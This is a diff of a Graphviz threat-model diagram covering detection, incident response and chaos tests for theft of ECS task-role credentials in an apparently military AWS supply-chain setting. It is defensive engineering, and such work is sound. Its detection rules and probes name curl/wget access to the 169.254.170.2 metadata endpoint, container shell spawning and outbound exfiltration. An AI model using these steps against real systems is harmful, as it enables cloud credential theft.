-            <b>STRIDE Goals Achieved:</b> Elevation of Privilege, Information Disclosure<br/>
+            <b>Scenario Impact:</b> Compromise of classified military supply chain data;<br/>
+            potential manipulation of warfighter supply inventories
         >, margin=0.2
     ];
 
-    "3.2-Detective" [
-        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
-        label=<
-            <b>3.2 Detective: Container Runtime Monitoring &amp; Credential Usage Analysis</b><br/>
-            <b>Classification: Detective</b><br/>
-            <b>Description:</b> Deploy container runtime security monitoring (Falco, Sysdig) to detect<br/>
-            docker exec commands. CloudTrail data events track ECS task role credential usage.<br/>
-            GuardDuty detects anomalous API calls from ECS task credentials. VPC Flow Logs identify<br/>
-            unusual metadata service access patterns. CloudWatch Container Insights monitors runtime behavior.<br/>
-            <b>AWS Services:</b> CloudTrail, GuardDuty, VPC Flow Logs, CloudWatch, EventBridge<br/>
-            <b>Detection Logic:</b><br/>
-            1. Falco rule: Detect "docker exec" commands on ECS container instances<br/>
-            2. VPC Flow Logs: Alert on traffic to 169.254.170.2 (ECS task metadata endpoint)<br/>
-            3. CloudTrail: Monitor API calls using ECS task role credentials from unusual source IPs<br/>
-            4. GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS<br/>
-            5. CloudWatch Logs Insights: Query for curl/wget commands targeting metadata service<br/>
-            6. Behavioral analytics: Detect ECS task credentials used outside expected VPC/region<br/>
-            7. S3 access logs: Unusual access patterns to s3://defense-supply-chain-ammunition-data<br/>
-            <b>Alert Threshold:</b> CRITICAL severity - Container escape + credential theft detected<br/>
-            <b>MTTD Target:</b> &lt; 3 minutes from docker exec to alert generation<br/>
-            <b>Correlation:</b> Link docker exec event → metadata access → API call with stolen creds<br/>
-        >, margin=0.2
-    ];
-
-    "3.3-Reactive" [
-        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
-        label=<
-            <b>3.3 Reactive: Emergency Credential Revocation &amp; Incident Response</b><br/>
-            <b>Classification: Reactive</b><br/>
-            <b>Description:</b> Immediate revocation of compromised ECS task role credentials. Terminate<br/>
-            all ECS tasks using affected task roles. Isolate compromised EC2 instance. Initiate<br/>
-            full incident response workflow including forensic analysis, blast radius assessment,<br/>
-            and breach notification (classified data exposure).<br/>
-            <b>AWS Services:</b> Lambda, Step Functions, ECS, IAM, STS, EC2, S3, SNS, Security Hub<br/>
-            <b>Automated Response Workflow (CRITICAL Severity):</b><br/>
-            1. STS GetCallerIdentity - identify compromised task role ARN<br/>
-            2. IAM AttachRolePolicy - attach explicit deny-all policy to compromised task role<br/>
-            3. ECS StopTask - terminate all tasks using compromised task role (force=true)<br/>
-            4. ECS UpdateService - update service to use new task role with rotated credentials<br/>
-            5. EC2 ModifyInstanceAttribute - disable source/dest check, apply quarantine SG<br/>
-            6. EC2 CreateSnapshot - capture memory dump and EBS volumes for forensics<br/>
-            7. CloudTrail LookupEvents - analyze all API calls made with stolen credentials<br/>
-            8. S3 GetObjectVersions - identify data accessed in ammunition/medical/rations buckets<br/>
-            9. KMS DescribeKey - check if encryption keys were accessed<br/>
-            10. Secrets Manager DescribeSecret - verify if secrets were retrieved<br/>
-            11. Generate incident report with blast radius assessment<br/>
-            12. Notify CISO, Security Lead, and Military Command (CRITICAL escalation)<br/>
-            13. Initiate breach notification process (classified data exposure protocol)<br/>
-            14. Trigger forensic analysis workflow in isolated VPC<br/>
-            15. Rotate all related credentials (task roles, instance profiles, access keys)<br/>
-            <b>MTTR Target:</b> &lt; 5 minutes from detection to credential revocation<br/>
-            <b>Breach Notification:</b> Immediate notification to DoD Cyber Crime Center (DC3)<br/>
-            <b>Forensic Preservation:</b> All artifacts stored in S3 with MFA Delete + Object Lock<br/>
-            <b>Recovery Actions:</b> Rebuild ECS cluster from golden AMIs, redeploy workloads to Fargate<br/>
-        >, margin=0.2
-    ];
-
-    "3.4-Chaos" [
+    "3.3-Chaos" [
         shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
         label=<
-            <b>3.4 Security Chaos Engineering Experiment</b><br/>
-            <b>Preventive Probe:</b> Attempt to SSH into production ECS container instance using test<br/>
-            credentials. Verify security group blocks port 22. Attempt docker exec command via SSM<br/>
-            Session Manager. Verify AppArmor/SELinux policy denies action. Attempt to access metadata<br/>
-            service (169.254.170.2) from test container. Verify NACL blocks traffic.<br/>
-            Expected Result: All access attempts denied, no SSH connectivity, docker exec blocked.<br/>
-            <b>Detective Probe:</b> In isolated test environment, simulate docker exec command on test<br/>
-            ECS instance. Verify Falco generates alert within 30 seconds. Simulate metadata service<br/>
-            access from test container. Verify VPC Flow Logs capture traffic and trigger alert.<br/>
-            Use test ECS task credentials to make API call from unauthorized IP. Verify GuardDuty<br/>
-            detects anomalous credential usage within 5 minutes. Confirm all alerts visible in Security Hub.<br/>
-            Expected Result: All detection mechanisms trigger within MTTD SLA (3 minutes).<br/>
-            <b>Reactive Probe:</b> Trigger Step Functions incident response workflow with simulated<br/>
-            credential theft event. Verify workflow executes all 15 steps: credential revocation,<br/>
-            task termination, instance quarantine, forensic capture, blast radius analysis, notifications.<br/>
-            Validate incident report generated with complete timeline. Confirm CISO notification sent<br/>
-            via PagerDuty. Verify forensic artifacts stored in S3 with MFA Delete enabled.<br/>
-            Expected Result: Complete workflow execution within 5-minute MTTR, all stakeholders notified,<br/>
-            forensic chain of custody maintained, breach notification process initiated.<br/>
-            <b>Validation Frequency:</b> Monthly automated chaos test, quarterly red team exercise,<br/>
-            annual DoD IG audit simulation<br/>
-            <b>Success Criteria:</b> 100% detection rate, &lt;5min MTTR, zero false negatives<br/>
+            <b>3.3 SCE Experiment: Credential Extraction Chaos Test</b><br/>
+            <b>Preventive Probe:</b><br/>
+            • Attempt SSH connection → Expect connection refused (SSH disabled)<br/>
+            • Try docker exec command → Expect AppArmor denial<br/>
+            • Curl metadata endpoint from container → Expect IMDSv2 token requirement<br/>
+            • Access credential URI without proper network source → Expect IP condition denial<br/>
+            <b>Detective Probe:</b><br/>
+            • Simulate docker exec execution → Verify GuardDuty Runtime alert within 30 sec<br/>
+            • Trigger metadata endpoint access → Confirm CloudWatch Logs capture within 1 min<br/>
+            • Generate credential API call → Verify CloudTrail STS:AssumeRole event logged<br/>
+            • Simulate exfiltration attempt → Confirm VPC Flow Logs show outbound connection<br/>
+            • Validate Falco alert: "Container shell spawned" within 15 seconds<br/>
+            <b>Reactive Probe:</b><br/>
+            • Trigger credential extraction detection → Verify STS:RevokeSession called<br/>
+            • Confirm container killed within 30 seconds of detection<br/>
+            • Validate ECS task stopped and instance quarantined within 1 minute<br/>
+            • Check automated forensic snapshot created with credential access logs<br/>
+            • Verify SOC receives HIGH severity alert with container details
+        >, margin=0.2
+    ];
+
+    "3.4-Detective" [
+        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
+        label=<
+            <b>3.4 Detective: Detect Container Access and Credential Theft</b><br/>
+            <b>Classification: Detective</b><br/>
+            <b>Controls:</b><br/>
+            • GuardDuty Runtime Monitoring:<br/>
+            &#160;&#160;- Execution:ECS/SuspiciousCommandInContainer<br/>
+            &#160;&#160;- CredentialAccess:ECS/AnomalousCredentialAccess<br/>
+            &#160;&#160;- Exfiltration:ECS/UnusualNetworkTraffic<br/>
+            • CloudWatch Logs: Docker daemon audit logs showing exec commands<br/>
+            • Falco runtime rules:<br/>
+            &#160;&#160;- "Terminal shell in container"<br/>
+            &#160;&#160;- "Metadata service accessed from container"<br/>
+            &#160;&#160;- "Outbound connection to suspicious domain"<br/>
+            • CloudTrail: STS:AssumeRole calls from ECS task role with anomalous source IP<br/>
+            • VPC Flow Logs: Container ENI showing connection to 169.254.170.2<br/>
+            • ECS CloudWatch Container Insights: Process-level monitoring<br/>
+            • Macie: Detection of credential patterns in S3 logs<br/>
+            • Detective: Behavioral analysis of credential usage patterns<br/>
+            • CloudWatch Anomaly Detection: Unusual API call volume from task role<br/>
+            <b>Scenario Context:</b> Real-time monitoring of classified container workloads;<br/>
+            ML-based detection of credential abuse patterns
+        >, margin=0.2
+    ];
+
+    "3.5-Reactive" [
+        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
+        label=<
+            <b>3.5 Reactive: Respond to Credential Theft</b><br/>
+            <b>Classification: Reactive</b><br/>
+            <b>Controls:</b><br/>
+            • Lambda function (Credential-Theft-Response):<br/>
+            &#160;&#160;- Parse GuardDuty finding for task ARN and role ARN<br/>
+            &#160;&#160;- Call STS:RevokeSession to invalidate all credentials<br/>
+            &#160;&#160;- Stop ECS task immediately (ecs:StopTask)<br/>
+            &#160;&#160;- Quarantine container instance (modify security group)<br/>
+            &#160;&#160;- Tag all resources with "CREDENTIAL_COMPROMISE"<br/>
+            • Step Functions workflow (Supply-Chain-Breach-Response):<br/>
+            &#160;&#160;1. Revoke all active sessions for compromised task role<br/>
+            &#160;&#160;2. Analyze CloudTrail for unauthorized API calls using stolen credentials<br/>
+            &#160;&#160;3. Snapshot container filesystem for forensics<br/>
+            &#160;&#160;4. Export container logs to S3 with Object Lock<br/>
+            &#160;&#160;5. Scan all accessed resources (S3, DynamoDB, RDS) for tampering<br/>
+            &#160;&#160;6. Rotate all secrets in Secrets Manager for affected applications<br/>
+            &#160;&#160;7. Deregister container instance and terminate EC2<br/>
+            &#160;&#160;8. Rebuild ECS cluster from golden AMI<br/>
+            &#160;&#160;9. Notify DoD Cyber Crime Center with full incident report<br/>
+            &#160;&#160;10. Generate CMMC incident documentation<br/>
+            • Automated threat hunting: Scan all ECS clusters for similar compromise<br/>
+            • IAM Access Analyzer: Identify all resources accessed by stolen credentials<br/>
+            • AWS Backup: Restore supply chain databases to pre-compromise state<br/>
+            <b>Scenario Context:</b> Critical national security incident response;<br/>
+            immediate containment and forensic preservation for military investigation
         >, margin=0.2
     ];
 
     // ============================================================================
-    // FINAL NODE
+    // CONNECTIONS
     // ============================================================================
 
-    "Final_Node" [label=<
-        <b>Final Attack Goal Achieved</b><br/>
-        <b>STRIDE Classification:</b> Elevation of Privilege, Information Disclosure<br/>
-        <b>Impact:</b> Attacker gained unauthorized access to classified supply chain data<br/>
-        (ammunition inventory, medical supplies, rations distribution) via stolen ECS<br/>
-        task role credentials. Potential exfiltration of SECRET-level operational data<br/>
-        affecting warfighter readiness across global military bases.<br/>
-        <b>Mission Compromise:</b> CRITICAL - Supply chain integrity threatened<br/>
-    >,
-        shape=rectangle, style=filled, fillcolor="#8B0000", fontcolor="white"];
+    // Alignment constraints
+    {rank=same; "1.3-Chaos"; "1.2-Attack"}
+    {rank=same; "1.4-Detective"; "1.5-Reactive"}
+    {rank=same; "2.3-Chaos"; "2.2-Attack"}
+    {rank=same; "2.4-Detective"; "2.5-Reactive"}
+    {rank=same; "3.3-Chaos"; "3.2-Attack"}
+    {rank=same; "3.4-Detective"; "3.5-Reactive"}
 
-    // ============================================================================
-    // GRAPH STRUCTURE - ATTACK PATH FLOW
-    // ============================================================================
+    // Main attack flow
+    "Root_Node" -> "1.1-Preventive";
+    "1.1-Preventive" -> "1.2-Attack";
+    "1.2-Attack" -> "1.4-Detective";
+    "1.2-Attack" -> "1.5-Reactive";
+    "1.4-Detective" -> "2.1-Preventive";
+    "1.5-Reactive" -> "2.1-Preventive";
 
-    // Branch 1: User Data Script Creation
-    {rank=same; "1.4-Chaos"; "1.1-Attack"}
-    {rank=same; "1.2-Detective"; "1.3-Reactive"}
+    "2.1-Preventive" -> "2.2-Attack";
+    "2.2-Attack" -> "2.4-Detective";
+    "2.2-Attack" -> "2.5-Reactive";
+    "2.4-Detective" -> "3.1-Preventive";
+    "2.5-Reactive" -> "3.1-Preventive";
 
-    "Root_Node" -> "1.0-Preventive";
-    "1.0-Preventive" -> "1.1-Attack";
-    "1.1-Attack" -> "1.2-Detective";
-    "1.1-Attack" -> "1.3-Reactive";
-    "1.1-Attack" -> "1.4-Chaos" [style=dashed, color="#FC8600"];
+    "3.1-Preventive" -> "3.2-Attack";
+    "3.2-Attack" -> "3.4-Detective";
+    "3.2-Attack" -> "3.5-Reactive";
+    "3.4-Detective" -> "Final_Node";
+    "3.5-Reactive" -> "Final_Node";
 
-    // Branch 2: EC2 Instance Launch
-    {rank=same; "2.4-Chaos"; "2.1-Attack"}
-    {rank=same; "2.2-Detective"; "2.3-Reactive"}
-
-    "1.2-Detective" -> "2.0-Preventive";
-    "1.3-Reactive" -> "2.0-Preventive";
-    "2.0-Preventive" -> "2.1-Attack";
-    "2.1-Attack" -> "2.2-Detective";
-    "2.1-Attack" -> "2.3-Reactive";
-    "2.1-Attack" -> "2.4-Chaos" [style=dashed, color="#FC8600"];
-
-    // Branch 3: Credential Extraction
-    {rank=same; "3.4-Chaos"; "3.1-Attack"}
-    {rank=same; "3.2-Detective"; "3.3-Reactive"}
-
-    "2.2-Detective" -> "3.0-Preventive";
-    "2.3-Reactive" -> "3.0-Preventive";
-    "3.0-Preventive" -> "3.1-Attack";
-    "3.1-Attack" -> "3.2-Detective";
-    "3.1-Attack" -> "3.3-Reactive";
-    "3.1-Attack" -> "3.4-Chaos" [style=dashed, color="#FC8600"];
-
-    // Final convergence
-    "3.2-Detective" -> "Final_Node";
-    "3.3-Reactive" -> "Final_Node";
+    // Chaos node connections
+    "1.2-Attack" -> "1.3-Chaos" [style=dashed, color="#FC8600"];
+    "2.2-Attack" -> "2.3-Chaos" [style=dashed, color="#FC8600"];
+    "3.2-Attack" -> "3.3-Chaos" [style=dashed, color="#FC8600"];
 }
